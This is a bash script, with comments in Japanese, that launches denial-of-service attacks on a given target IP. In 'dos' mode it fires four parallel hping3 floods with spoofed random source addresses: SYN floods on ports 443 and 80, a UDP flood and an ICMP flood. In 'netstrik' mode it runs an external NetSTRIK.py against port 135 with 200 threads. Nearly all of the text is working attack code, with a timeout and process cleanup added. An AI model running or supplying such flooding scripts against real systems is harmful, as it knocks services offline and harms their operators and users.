#!/bin/bash
# Usage: ./attack.sh <TARGET_IP> <DURATION> <MODE>
# MODE: 'dos' (hping3 flood) or 'netstrik' (NetSTRIK.py)

TARGET=${1:-"127.0.0.1"}
DURATION=${2:-"15"}
MODE=${3:-"dos"}

# 実行権限チェック
if [ "$EUID" -ne 0 ]; then 
  echo "[!] WARNING: This script requires root privileges."
fi

# 安全装置: スクリプト終了時にバックグラウンドジョブを強制終了
cleanup() {
  echo "[*] Cleaning up processes..."
  # バックグラウンドジョブがある場合のみkill
  jobs_p=$(jobs -p)
  if [ -n "$jobs_p" ]; then
      kill $jobs_p 2>/dev/null
  fi
  
  # NetSTRIK.py や hping3 が残留しないように念のためpkill
  pkill -f "NetSTRIK.py" > /dev/null 2>&1
  pkill -f "hping3" > /dev/null 2>&1
}

# EXIT(終了時)だけでなく、INT(Ctrl+C)受信時もクリーンアップを実行して終了
trap "cleanup; exit 1" INT TERM EXIT

echo "=========================================="
echo "[*] TARGET: $TARGET"
echo "[*] DURATION: ${DURATION}s"
echo "[*] MODE: $MODE"
echo "=========================================="

if [ "$MODE" = "dos" ]; then
    echo "[*] LAUNCHING MULTI-VECTOR FLOOD ATTACK (hping3)..."
    
    timeout -k 1s ${DURATION}s hping3 -S -p 443 --flood --rand-source $TARGET > /dev/null 2>&1 &
    PID1=$!
    echo "[+] Vector 1 (TCP/443) Fired (PID: $PID1)"

    timeout -k 1s ${DURATION}s hping3 -S -p 80 --flood --rand-source $TARGET > /dev/null 2>&1 &
    PID2=$!
    echo "[+] Vector 2 (TCP/80)  Fired (PID: $PID2)"

    timeout -k 1s ${DURATION}s hping3 --udp --flood --rand-source $TARGET > /dev/null 2>&1 &
    PID3=$!
    echo "[+] Vector 3 (UDP)     Fired (PID: $PID3)"

    timeout -k 1s ${DURATION}s hping3 -1 --flood -d 1200 --rand-source $TARGET > /dev/null 2>&1 &
    PID4=$!
    echo "[+] Vector 4 (ICMP)    Fired (PID: $PID4)"

    echo "------------------------------------------"
    echo "[!] ALL GUNS BLAZING. HOLDING FIRE FOR ${DURATION}s..."
    
    # 全てのバックグラウンドプロセスが終わるのを待つ
    wait $PID1 $PID2 $PID3 $PID4

elif [ "$MODE" = "netstrik" ]; then
    echo "[*] LAUNCHING NetSTRIK ATTACK (Python)..."
    
    SCRIPT_DIR=$(dirname "$0")
    NETSTRIK_PATH="$SCRIPT_DIR/NetSTRIK.py"
    
    if [ -f "$NETSTRIK_PATH" ]; then
        # -u オプションでバッファリングを無効化
        # -k 1s で強制終了を指定
        timeout -k 1s ${DURATION}s python3 -u "$NETSTRIK_PATH" -s $TARGET -p 135 -t 200
        
        # 念のための強制終了 (timeoutが効かなかった場合用)
        pkill -f "NetSTRIK.py" > /dev/null 2>&1
    else
        echo "[ERROR] NetSTRIK.py not found at $NETSTRIK_PATH"
    fi

else
    echo "[ERROR] Unknown mode: $MODE"
fi

echo "[*] CEASE FIRE. ATTACK COMPLETE."
